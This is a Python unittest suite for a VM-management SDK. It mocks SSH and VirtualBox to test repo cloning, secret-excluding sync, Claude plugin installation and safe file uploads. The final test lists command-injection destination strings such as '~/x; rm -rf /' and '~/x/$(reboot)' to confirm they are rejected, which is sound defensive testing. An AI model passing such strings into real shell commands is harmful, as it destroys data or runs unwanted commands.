#!/usr/bin/env python3
"""Hermetic + live tests for vmsdk (stdlib unittest; run: python scripts/lib/test-vmsdk.py).

Hermetic tests mock `vbox` and the SSH client, so they run on any box. The
`TestLiveUbuntu` class is guarded by a reachability probe and is skipped (not
failed) when ubuntu_new is not up on 127.0.0.1:2222.
"""
import os
import socket
import sys
import unittest
from pathlib import Path
from unittest import mock

sys.path.insert(0, str(Path(__file__).resolve().parent))
import vmsdk


class _FakeChannel:
    def __init__(self, rc):
        self._rc = rc
    def recv_exit_status(self):
        return self._rc


class _FakeStream:
    def __init__(self, data, rc=0):
        self._data = data.encode()
        self.channel = _FakeChannel(rc)
    def read(self):
        return self._data


class _FakeClient:
    """Stand-in for paramiko.SSHClient covering exec_command + close."""
    def __init__(self, rc=0, out="", err=""):
        self._rc, self._out, self._err = rc, out, err
        self.closed = False
    def exec_command(self, cmd, get_pty=False, timeout=None):
        return (None, _FakeStream(self._out, self._rc), _FakeStream(self._err))
    def close(self):
        self.closed = True


class TestConstruction(unittest.TestCase):
    def _env(self, **kw):
        base = {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}
        base.update(kw)
        return base

    def test_known_vm_resolves_fields(self):
        with mock.patch.dict(os.environ, self._env(), clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                vm = vmsdk.VM("ubuntu_new")
        self.assertEqual(vm.os, "ubuntu")
        self.assertEqual(vm.port, 2222)
        self.assertEqual(vm.host, "127.0.0.1")
        self.assertEqual(vm.user, "osboxes")
        self.assertEqual(vm.password, "pw")

    def test_unknown_vm_lists_known(self):
        with self.assertRaises(vmsdk.VMError) as cm:
            vmsdk.VM("nope")
        self.assertIn("ubuntu_new", str(cm.exception))

    def test_missing_env_names_key(self):
        with mock.patch.dict(os.environ, {}, clear=True):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                with self.assertRaises(vmsdk.VMError) as cm:
                    vmsdk.VM("ubuntu_new")
        self.assertIn("ubuntu_vm_user", str(cm.exception))


class TestLifecycleExec(unittest.TestCase):
    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def test_up_waits_for_ssh(self):
        vm = self._vm()
        with mock.patch.object(vmsdk.vbox, "ensure_running") as er, \
             mock.patch.object(vmsdk.vbox, "wait_for_ssh", return_value="SSH-2.0-x") as w:
            self.assertEqual(vm.up(), "SSH-2.0-x")
            er.assert_called_once_with("ubuntu_new")
            w.assert_called_once_with("127.0.0.1", 2222)

    def test_run_non_sudo_merges_streams(self):
        vm = self._vm()
        fake = _FakeClient(rc=0, out="hi\n", err="")
        with mock.patch.object(vm, "ssh", return_value=fake):
            rc, out = vm.run("echo hi")
        self.assertEqual(rc, 0)
        self.assertIn("hi", out)

    def test_run_sudo_on_windows_raises(self):
        with mock.patch.dict(os.environ,
                             {"windows_vm_user": "demo", "windows_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                vm = vmsdk.VM("win11_base_himmel")
        with self.assertRaises(vmsdk.VMError):
            vm.run("whoami", sudo=True)

    def test_down_invalidates_client(self):
        vm = self._vm()
        vm._client = mock.Mock()
        with mock.patch.object(vmsdk.vbox, "power_off"):
            vm.down()
        self.assertIsNone(vm._client)

    def test_ensure_up_skips_when_reachable(self):
        vm = self._vm()
        with mock.patch.object(vmsdk.socket, "create_connection"), \
             mock.patch.object(vm, "up") as u:
            self.assertIsNone(vm.ensure_up())
            u.assert_not_called()

    def test_ensure_up_calls_up_when_unreachable(self):
        vm = self._vm()
        with mock.patch.object(vmsdk.socket, "create_connection", side_effect=OSError), \
             mock.patch.object(vm, "up", return_value="SSH-2.0-x") as u:
            self.assertEqual(vm.ensure_up(), "SSH-2.0-x")
            u.assert_called_once_with()

    def test_ssh_falls_back_to_key_on_auth_failure(self):
        import paramiko
        vm = self._vm()
        calls = []

        class _FakeSSH:
            def set_missing_host_key_policy(self, policy):
                pass
            def connect(self, **kw):
                calls.append(kw)
                if "password" in kw:
                    raise paramiko.AuthenticationException("password rejected")
                # key path: succeed
            def close(self):
                pass

        with mock.patch.object(paramiko, "SSHClient", return_value=_FakeSSH()):
            client = vm.ssh()
        self.assertIsInstance(client, _FakeSSH)
        self.assertEqual(len(calls), 2)
        self.assertIn("password", calls[0])
        self.assertIn("key_filename", calls[1])

    def test_run_sudo_wraps_with_pty_and_password(self):
        vm = self._vm()
        rec = {}

        class _FakeC:
            def exec_command(self, cmd, get_pty=False, timeout=None):
                rec["cmd"], rec["pty"] = cmd, get_pty
                return (None, _FakeStream("done", 0), _FakeStream(""))

        with mock.patch.object(vm, "ssh", return_value=_FakeC()):
            rc, out = vm.run("apt-get update", sudo=True)
        self.assertEqual(rc, 0)
        self.assertTrue(rec["pty"])
        self.assertIn("sudo -S", rec["cmd"])
        self.assertIn("pw", rec["cmd"])  # password interpolated into the wrapper


class TestSnapshots(unittest.TestCase):
    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def test_restore_invalidates_client(self):
        vm = self._vm()
        vm._client = mock.Mock()
        with mock.patch.object(vmsdk.vbox, "restore_snapshot"):
            vm.restore("clean")
        self.assertIsNone(vm._client)

    def test_baseline_existing_snapshot_restores_no_provision(self):
        vm = self._vm()
        with mock.patch.object(vm, "snapshots", return_value=["clean"]), \
             mock.patch.object(vm, "restore") as r, \
             mock.patch.object(vm, "up") as u, \
             mock.patch.object(vm, "provision") as p, \
             mock.patch.object(vm, "snapshot") as s:
            result = vm.baseline("clean")
        self.assertEqual(result, "restored")
        r.assert_called_once_with("clean")
        u.assert_called_once_with()
        p.assert_not_called()
        s.assert_not_called()

    def test_baseline_absent_snapshot_provisions_once(self):
        vm = self._vm()
        with mock.patch.object(vm, "snapshots", return_value=[]), \
             mock.patch.object(vm, "up") as u, \
             mock.patch.object(vm, "provision") as p, \
             mock.patch.object(vm, "snapshot") as s:
            result = vm.baseline("clean")
        self.assertEqual(result, "provisioned")
        u.assert_called_once_with()
        p.assert_called_once_with()
        s.assert_called_once_with("clean")


class TestClone(unittest.TestCase):
    def setUp(self):
        # Keep env live for the whole method: clone_himmel reads the PAT at call
        # time, mirroring production where _load_dotenv_into_env() persists .env
        # into os.environ. (A transient with-block patch would expire too early.)
        envp = mock.patch.dict(os.environ,
            {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p",
             "windows_vm_user": "u", "windows_vm_pass": "p",
             "himmel_github_token_vm": "TKN"}, clear=False)
        envp.start(); self.addCleanup(envp.stop)
        dp = mock.patch.object(vmsdk, "_load_dotenv_into_env")
        dp.start(); self.addCleanup(dp.stop)

    def _vm(self, name="ubuntu_new"):
        return vmsdk.VM(name)

    def test_clone_builds_token_url_and_strips(self):
        vm = self._vm()
        calls = []
        def fake_run(cmd, **kw):
            calls.append(cmd)
            if cmd.startswith("test -e"):
                return (1, "")          # dest absent
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            dest = vm.clone_himmel(ref="main", depth=1)
        self.assertEqual(dest, "~/himmel")
        joined = "\n".join(calls)
        self.assertIn("x-access-token:TKN@github.com/yotamleo/himmel-private.git", joined)
        self.assertIn("--depth 1", joined)
        self.assertIn("--branch main", joined)
        self.assertIn("set-url origin https://github.com/yotamleo/himmel-private.git", joined)

    def test_clone_refuses_existing_dest(self):
        vm = self._vm()
        with mock.patch.object(vm, "run", return_value=(0, "")):  # test -e => exists
            with self.assertRaises(vmsdk.VMError):
                vm.clone_himmel()

    def test_clone_raises_on_clone_failure(self):
        vm = self._vm()
        def fake_run(cmd, **kw):
            if cmd.startswith("test -e"):
                return (1, "")
            if "clone" in cmd:
                return (128, "fatal: auth")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(vmsdk.VMError):
                vm.clone_himmel()

    def test_clone_windows_routes_through_git_bash(self):
        vm = self._vm("win11_base_himmel")
        calls = []
        def fake_run(cmd, **kw):
            calls.append(cmd)
            if cmd.startswith("if exist"):
                return (0, "")          # else-branch exit 0 => dest absent
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            dest = vm.clone_himmel(ref="main", depth=1)
        self.assertEqual(dest, r"C:\himmel")
        joined = "\n".join(calls)
        self.assertIn(r"if exist C:\himmel", joined)
        self.assertIn(r'"C:\Program Files\Git\bin\bash.exe" -lc', joined)
        self.assertIn("x-access-token:TKN@github.com/yotamleo/himmel-private.git", joined)
        self.assertIn("set-url origin https://github.com/yotamleo/himmel-private.git", joined)


class TestProvisionE2E(unittest.TestCase):
    def _ubuntu(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def _windows(self):
        with mock.patch.dict(os.environ,
                             {"windows_vm_user": "demo", "windows_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("win11_base_himmel")

    def test_provision_ubuntu_shells_setup_script(self):
        vm = self._ubuntu()
        with mock.patch.object(vmsdk.subprocess, "run",
                               return_value=mock.Mock(returncode=0)) as sr:
            vm.provision()
        argv = sr.call_args[0][0]
        self.assertIn("ubuntu-vm-setup.py", " ".join(argv))
        self.assertIn("--vm-name", argv)
        self.assertIn("ubuntu_new", argv)

    def test_provision_raises_on_failure(self):
        vm = self._ubuntu()
        with mock.patch.object(vmsdk.subprocess, "run",
                               return_value=mock.Mock(returncode=1)):
            with self.assertRaises(vmsdk.VMError):
                vm.provision()

    def test_run_e2e_ubuntu_passes_user_at_localhost(self):
        vm = self._ubuntu()
        with mock.patch.object(vmsdk.subprocess, "run",
                               return_value=mock.Mock(returncode=0)) as sr:
            rc = vm.run_e2e()
        self.assertEqual(rc, 0)
        argv = sr.call_args[0][0]
        self.assertIn("test-install-symmetry-vm.sh", " ".join(argv))
        self.assertIn("osboxes@localhost", argv)   # NOT bare "localhost"
        self.assertIn("2222", [str(a) for a in argv])
        # Bash (Git Bash on Windows) mangles backslash paths — every arg PASSED TO
        # bash (argv[1:], not the interpreter argv[0]) must be backslash-free
        # (relative posix script path + forward-slash ident).
        for a in argv[1:]:
            self.assertNotIn("\\", str(a))
        # cwd is THIS checkout's root (so the colocated script tests this tree).
        self.assertEqual(sr.call_args.kwargs.get("cwd"),
                         str(Path(vmsdk.__file__).resolve().parents[2]))

    def test_run_e2e_windows_not_implemented(self):
        vm = self._windows()
        with self.assertRaises(NotImplementedError):
            vm.run_e2e()


class TestCLI(unittest.TestCase):
    def test_unknown_command_exit_2(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                rc = vmsdk.main(["ubuntu_new", "bogus"])
        self.assertEqual(rc, 2)

    def test_no_args_exit_2(self):
        self.assertEqual(vmsdk.main([]), 2)

    def test_e2e_propagates_rc(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                with mock.patch.object(vmsdk.VM, "run_e2e", return_value=3):
                    rc = vmsdk.main(["ubuntu_new", "e2e"])
        self.assertEqual(rc, 3)

    def test_e2e_windows_not_implemented_exit_4(self):
        with mock.patch.dict(os.environ,
                             {"windows_vm_user": "d", "windows_vm_pass": "p"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                rc = vmsdk.main(["win11_base_himmel", "e2e"])
        self.assertEqual(rc, 4)

    def test_baseline_prints_indicator(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                with mock.patch.object(vmsdk.VM, "baseline", return_value="restored") as b:
                    rc = vmsdk.main(["ubuntu_new", "baseline", "clean"])
        self.assertEqual(rc, 0)
        b.assert_called_once_with("clean")

    def test_operational_vmerror_exit_1(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "u", "ubuntu_vm_pass": "p"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                with mock.patch.object(vmsdk.VM, "clone_himmel",
                                       side_effect=vmsdk.VMError("dest exists")):
                    rc = vmsdk.main(["ubuntu_new", "clone"])
        self.assertEqual(rc, 1)


class TestSyncRepo(unittest.TestCase):
    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def _captured_argv(self, vm, local_root, **kw):
        """Run sync_repo with a mocked subprocess.run and return the argv passed to it."""
        calls = []
        def fake_run(argv, **kwargs):
            calls.append(argv)
            return mock.Mock(returncode=0, stderr="")
        with mock.patch.object(vmsdk.subprocess, "run", side_effect=fake_run):
            vm.sync_repo(local_root, **kw)
        self.assertEqual(len(calls), 1)
        return calls[0]

    def test_command_contains_dest_mkdir_and_tar_extract(self):
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel")
        joined = " ".join(str(a) for a in argv)
        self.assertIn("mkdir -p ~/github/himmel", joined)
        self.assertIn("tar xzf - -C ~/github/himmel", joined)

    def test_command_contains_key_flag_and_batchmode(self):
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel")
        joined = " ".join(str(a) for a in argv)
        self.assertIn("-i ", joined)
        self.assertIn("BatchMode=yes", joined)

    def test_command_contains_default_excludes(self):
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel")
        joined = " ".join(str(a) for a in argv)
        self.assertIn("--exclude=.git", joined)
        self.assertIn("--exclude=node_modules", joined)
        self.assertIn("--exclude=.claude/worktrees", joined)

    def test_command_excludes_dotenv_secrets(self):
        """`.env` (VM creds + GitHub PAT) must never be tar'd to the guest."""
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel")
        joined = " ".join(str(a) for a in argv)
        self.assertIn("--exclude=.env", joined)
        self.assertIn("--exclude=.env.*", joined)

    def test_no_backslashes_in_command_for_windows_path(self):
        """Forward-slash conversion must cover both key and local_root."""
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel")
        # The interpreter argv[0] may contain backslashes (path to bash.exe);
        # every argument passed INSIDE bash -c must be backslash-free.
        # The pipe string is always the last element when using bash -c form.
        pipe_str = str(argv[-1])
        self.assertNotIn("\\", pipe_str,
                         msg=f"backslash found in pipe string: {pipe_str!r}")

    def test_custom_dest_is_used(self):
        vm = self._vm()
        argv = self._captured_argv(vm, r"C:\Users\x\himmel", dest="~/myrepo")
        joined = " ".join(str(a) for a in argv)
        self.assertIn("mkdir -p ~/myrepo", joined)
        self.assertIn("tar xzf - -C ~/myrepo", joined)

    def test_nonzero_returncode_raises_environment_error(self):
        vm = self._vm()
        def fake_run(argv, **kwargs):
            return mock.Mock(returncode=255, stderr=b"publickey denied")
        with mock.patch.object(vmsdk.subprocess, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.sync_repo(r"C:\Users\x\himmel")

    def test_returns_dest_on_success(self):
        vm = self._vm()
        with mock.patch.object(vmsdk.subprocess, "run",
                               return_value=mock.Mock(returncode=0, stderr="")):
            result = vm.sync_repo(r"C:\Users\x\himmel")
        self.assertEqual(result, "~/github/himmel")


class TestInstallPlugin(unittest.TestCase):
    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def _make_fake_run(self, side_effects):
        """Return a fake run() that pops responses from side_effects by command prefix."""
        calls = []
        def fake_run(cmd, **kw):
            calls.append(cmd)
            for prefix, result in side_effects:
                if cmd.startswith(prefix):
                    return result
            return (0, "")
        return fake_run, calls

    def test_happy_path_succeeds_and_issues_correct_install_cmd(self):
        vm = self._vm()
        calls = []
        def fake_run(cmd, **kw):
            calls.append(cmd)
            if "cat" in cmd and "marketplace.json" in cmd:
                return (0, '{"name":"himmel"}')
            if "claude plugin marketplace add" in cmd:
                return (0, "")
            if "claude plugin install" in cmd:
                return (0, "Plugin installed")
            if "claude plugin list" in cmd:
                return (0, "obsidian-triage@himmel\nother@himmel\n")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            result = vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")
        self.assertIsNone(result)
        install_cmds = [c for c in calls if "claude plugin install" in c]
        self.assertEqual(len(install_cmds), 1)
        self.assertIn("obsidian-triage@himmel", install_cmds[0])
        self.assertIn("--scope user", install_cmds[0])

    def test_marketplace_add_failure_raises(self):
        vm = self._vm()
        def fake_run(cmd, **kw):
            if "cat" in cmd and "marketplace.json" in cmd:
                return (0, '{"name":"himmel"}')
            if "claude plugin marketplace add" in cmd:
                return (1, "error: not found")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")

    def test_plugin_absent_from_list_raises(self):
        vm = self._vm()
        def fake_run(cmd, **kw):
            if "cat" in cmd and "marketplace.json" in cmd:
                return (0, '{"name":"himmel"}')
            if "claude plugin marketplace add" in cmd:
                return (0, "")
            if "claude plugin install" in cmd:
                return (0, "")
            if "claude plugin list" in cmd:
                return (0, "other-plugin@himmel\n")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")

    def test_cat_marketplace_json_failure_raises(self):
        vm = self._vm()
        def fake_run(cmd, **kw):
            if "cat" in cmd and "marketplace.json" in cmd:
                return (1, "No such file or directory")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")

    def test_plugin_list_nonzero_rc_raises(self):
        vm = self._vm()
        def fake_run(cmd, **kw):
            if "cat" in cmd and "marketplace.json" in cmd:
                return (0, '{"name":"himmel"}')
            if "claude plugin marketplace add" in cmd:
                return (0, "")
            if "claude plugin install" in cmd:
                return (0, "")
            if "claude plugin list" in cmd:
                return (1, "error")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")

    def test_nonzero_install_rc_is_tolerated_if_list_confirms(self):
        """install can exit nonzero (already-installed); verify step is authoritative."""
        vm = self._vm()
        def fake_run(cmd, **kw):
            if "cat" in cmd and "marketplace.json" in cmd:
                return (0, '{"name":"himmel"}')
            if "claude plugin marketplace add" in cmd:
                return (0, "")
            if "claude plugin install" in cmd:
                return (1, "already installed")
            if "claude plugin list" in cmd:
                return (0, "obsidian-triage@himmel\n")
            return (0, "")
        with mock.patch.object(vm, "run", side_effect=fake_run):
            result = vm.install_plugin("~/github/himmel/marketplace", "obsidian-triage")
        self.assertIsNone(result)


class TestDriveClaude(unittest.TestCase):
    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    def _make_fake_run(self, responses):
        """Return (fake_run, calls_list).

        responses: list of (substring, (rc, out)) pairs checked in order.
        Falls back to (0, "") for unmatched commands.
        """
        calls = []
        def fake_run(cmd, **kw):
            calls.append(cmd)
            for substr, result in responses:
                if substr in cmd:
                    return result
            return (0, "")
        return fake_run, calls

    def test_happy_path_ordering_billing_quoting_abscwd(self):
        """(a) ordering, (b) billing guard, (c) quoting, (d) absolute cwd."""
        import shlex
        vm = self._vm()
        prompt = 'she said "go" and it\'s done'
        cwd = "~/luna-test-vault"
        abscwd = "/home/u/luna-test-vault"
        claude_path = "/usr/local/bin/claude"

        fake_run, calls = self._make_fake_run([
            ("bash -lc 'command -v claude'", (0, claude_path + "\n")),
            ("pwd",                (0, abscwd + "\n")),
            ("ensure-workspace-trust.sh", (0, "")),
            ("timeout",            (0, "Upgrade complete\n")),
        ])

        with mock.patch.object(vm, "run", side_effect=fake_run):
            rc, out = vm.drive_claude(prompt, cwd=cwd)

        self.assertEqual(rc, 0)
        self.assertEqual(out, "Upgrade complete\n")

        trust_idx  = next(i for i, c in enumerate(calls) if "ensure-workspace-trust.sh" in c)
        drive_idx  = next(i for i, c in enumerate(calls) if "timeout" in c)

        # (a) trust preseed recorded BEFORE the drive command
        self.assertLess(trust_idx, drive_idx,
                        msg="trust-preseed must run before the timeout/claude drive")

        drive_cmd = calls[drive_idx]

        # (b) billing guard: no -p or --print in the drive command
        self.assertNotIn(" -p ", drive_cmd)
        self.assertNotIn("--print", drive_cmd)

        # (c) quoting: raw unescaped prompt NOT present; the drive command is a
        # single bash -lc token whose inner string contains shlex.quote(prompt).
        # Because the inner string is itself shlex.quote'd for the outer command,
        # we recover the inner by splitting the outer and checking the -lc argument.
        self.assertNotIn(prompt, drive_cmd,
                         msg="raw prompt must not appear unquoted in drive command")
        # The outer command has the form: timeout … bash -lc <single-token>
        # shlex.split recovers the inner (unescaped) string from that token.
        outer_parts = shlex.split(drive_cmd)
        lc_idx = outer_parts.index("-lc")
        inner_str = outer_parts[lc_idx + 1]   # the unquoted inner bash string
        self.assertIn(shlex.quote(prompt), inner_str,
                      msg="shlex.quote(prompt) must appear in the -lc inner string")

        # (d) absolute cwd (not the ~ form) appears in both trust and inner cd
        trust_cmd = calls[trust_idx]
        self.assertIn(abscwd, trust_cmd,
                      msg="absolute cwd must appear in trust command")
        self.assertIn(f"cd {abscwd}", drive_cmd,
                      msg="absolute cwd must appear in inner cd of drive command")

    def test_claude_not_found_raises_environment_error(self):
        vm = self._vm()
        fake_run, _ = self._make_fake_run([
            ("bash -lc 'command -v claude'", (1, "")),
        ])
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.drive_claude("hello", cwd="/tmp")

    def test_claude_empty_path_raises_environment_error(self):
        vm = self._vm()
        fake_run, _ = self._make_fake_run([
            ("bash -lc 'command -v claude'", (0, "   \n")),
        ])
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.drive_claude("hello", cwd="/tmp")

    def test_pwd_failure_raises_environment_error(self):
        vm = self._vm()
        fake_run, _ = self._make_fake_run([
            ("bash -lc 'command -v claude'", (0, "/usr/local/bin/claude\n")),
            ("pwd",               (1, "No such file")),
        ])
        with mock.patch.object(vm, "run", side_effect=fake_run):
            with self.assertRaises(EnvironmentError):
                vm.drive_claude("hello", cwd="~/nonexistent")

    def test_trust_failure_is_non_fatal(self):
        """Non-zero from ensure-workspace-trust.sh must not raise."""
        vm = self._vm()
        fake_run, calls = self._make_fake_run([
            ("bash -lc 'command -v claude'", (0, "/usr/local/bin/claude\n")),
            ("pwd",                      (0, "/home/u/myvault\n")),
            ("ensure-workspace-trust.sh",(1, "trust script error")),
            ("timeout",                  (0, "done\n")),
        ])
        with mock.patch.object(vm, "run", side_effect=fake_run):
            rc, out = vm.drive_claude("upgrade", cwd="~/myvault")
        self.assertEqual(rc, 0)

    def test_returns_rc_and_out_from_drive(self):
        """rc=124 (guest timeout kill) is passed through, not raised."""
        vm = self._vm()
        fake_run, _ = self._make_fake_run([
            ("bash -lc 'command -v claude'", (0, "/usr/local/bin/claude\n")),
            ("pwd",               (0, "/home/u/vault\n")),
            ("ensure-workspace-trust.sh", (0, "")),
            ("timeout",          (124, "Killed\n")),
        ])
        with mock.patch.object(vm, "run", side_effect=fake_run):
            rc, out = vm.drive_claude("run something", cwd="~/vault")
        self.assertEqual(rc, 124)
        self.assertIn("Killed", out)


class TestPushFile(unittest.TestCase):
    def setUp(self):
        import tempfile
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(lambda: __import__("shutil").rmtree(self.tmp, ignore_errors=True))
        self.local = Path(self.tmp) / "h.md"
        self.local.write_text("# handover\n")

    def _vm(self):
        with mock.patch.dict(os.environ,
                             {"ubuntu_vm_user": "osboxes", "ubuntu_vm_pass": "pw"}, clear=False):
            with mock.patch.object(vmsdk, "_load_dotenv_into_env"):
                return vmsdk.VM("ubuntu_new")

    class _FakeSFTP:
        """Records putfo/posix_rename calls; can be told to raise mid-upload."""
        def __init__(self, putfo_exc=None):
            self.putfo_calls = []
            self.rename_calls = []
            self.closed = False
            self._putfo_exc = putfo_exc
        def putfo(self, fobj, remote):
            if self._putfo_exc is not None:
                raise self._putfo_exc
            self.putfo_calls.append((fobj.read(), remote))
        def posix_rename(self, src, dst):
            self.rename_calls.append((src, dst))
        def close(self):
            self.closed = True

    def _fake_client(self, sftp):
        class _FakeClient:
            def open_sftp(_self):
                return sftp
        return _FakeClient()

    def test_happy_path_resolves_tilde_and_uploads_via_tmp_rename(self):
        vm = self._vm()
        sftp = self._FakeSFTP()
        cmds = []
        def fake_run(cmd, **kw):
            cmds.append(cmd)
            return (0, "/home/u/handover-inbox\n")
        with mock.patch.object(vm, "run", side_effect=fake_run), \
             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
            result = vm.push_file(str(self.local), "~/handover-inbox/h.md")
        self.assertEqual(result, "/home/u/handover-inbox/h.md")
        self.assertIn("mkdir -p ~/handover-inbox", cmds[0])
        # Uploaded bytes match the local file, but land at a TEMP name first...
        self.assertEqual(len(sftp.putfo_calls), 1)
        uploaded_bytes, tmp_remote = sftp.putfo_calls[0]
        self.assertEqual(uploaded_bytes, self.local.read_bytes())
        self.assertNotEqual(tmp_remote, "/home/u/handover-inbox/h.md")
        # ...then posix_rename'd into place: rename target = final path.
        self.assertEqual(len(sftp.rename_calls), 1)
        rename_src, rename_dst = sftp.rename_calls[0]
        self.assertEqual(rename_src, tmp_remote)
        self.assertEqual(rename_dst, "/home/u/handover-inbox/h.md")

    def test_upload_failure_raises_vmerror_and_still_closes_sftp(self):
        """A mid-putfo failure (e.g. a dropped connection) must surface as a
        clean VMError, and the sftp handle must still be closed (finally)."""
        vm = self._vm()
        sftp = self._FakeSFTP(putfo_exc=OSError("connection reset"))
        def fake_run(cmd, **kw):
            return (0, "/home/u/handover-inbox\n")
        with mock.patch.object(vm, "run", side_effect=fake_run), \
             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
            with self.assertRaises(vmsdk.VMError):
                vm.push_file(str(self.local), "~/handover-inbox/h.md")
        self.assertTrue(sftp.closed)

    def test_skip_if_exists_skips_upload_when_final_path_present(self):
        """Same-digest retry (skip_if_exists=True): the final path already
        exists on the guest -> no upload/rename happens at all, removing the
        rewrite window on a file an already-armed job may be reading."""
        vm = self._vm()
        sftp = self._FakeSFTP()
        run_calls = []
        def fake_run(cmd, **kw):
            run_calls.append(cmd)
            if cmd.startswith("test -f"):
                return (0, "")   # exists
            return (0, "/home/u/handover-inbox\n")
        with mock.patch.object(vm, "run", side_effect=fake_run), \
             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
            result = vm.push_file(str(self.local), "~/handover-inbox/h.md",
                                  data=b"content", skip_if_exists=True)
        self.assertEqual(result, "/home/u/handover-inbox/h.md")
        self.assertEqual(sftp.putfo_calls, [])
        self.assertEqual(sftp.rename_calls, [])
        self.assertTrue(any(c.startswith("test -f") for c in run_calls))

    def test_skip_if_exists_uploads_when_final_path_absent(self):
        vm = self._vm()
        sftp = self._FakeSFTP()
        def fake_run(cmd, **kw):
            if cmd.startswith("test -f"):
                return (1, "")   # absent
            return (0, "/home/u/handover-inbox\n")
        with mock.patch.object(vm, "run", side_effect=fake_run), \
             mock.patch.object(vm, "ssh", return_value=self._fake_client(sftp)):
            result = vm.push_file(str(self.local), "~/handover-inbox/h.md",
                                  data=b"content", skip_if_exists=True)
        self.assertEqual(result, "/home/u/handover-inbox/h.md")
        self.assertEqual(len(sftp.putfo_calls), 1)
        self.assertEqual(len(sftp.rename_calls), 1)

    def test_missing_local_raises(self):
        vm = self._vm()
        with self.assertRaises(vmsdk.VMError):
            vm.push_file(str(Path(self.tmp) / "absent.md"), "~/x/absent.md")

    def test_env_basename_refused(self):
        """VM creds + PAT live in .env — it must never be pushed to the guest."""
        vm = self._vm()
        envfile = Path(self.tmp) / ".env"
        envfile.write_text("secret=1\n")
        with self.assertRaises(vmsdk.VMError) as cm:
            vm.push_file(str(envfile), "~/x/.env")
        self.assertIn(".env", str(cm.exception))

    def test_mkdir_failure_raises(self):
        vm = self._vm()
        with mock.patch.object(vm, "run", return_value=(1, "read-only fs")):
            with self.assertRaises(vmsdk.VMError):
                vm.push_file(str(self.local), "~/x/h.md")

    def test_shell_metacharacters_in_remote_refused(self):
        """remote is interpolated unquoted (guest ~ expansion) — charset-
        validate so a crafted destination cannot inject guest commands."""
        vm = self._vm()
        for evil in ("~/x; rm -rf /", "~/x/$(reboot)", "~/x/`id`", "~/x/a b"):
            with mock.patch.object(vm, "run") as r:
                with self.assertRaises(vmsdk.VMError):
                    vm.push_file(str(self.local), evil)
                r.assert_not_called()  # refused BEFORE any guest command runs


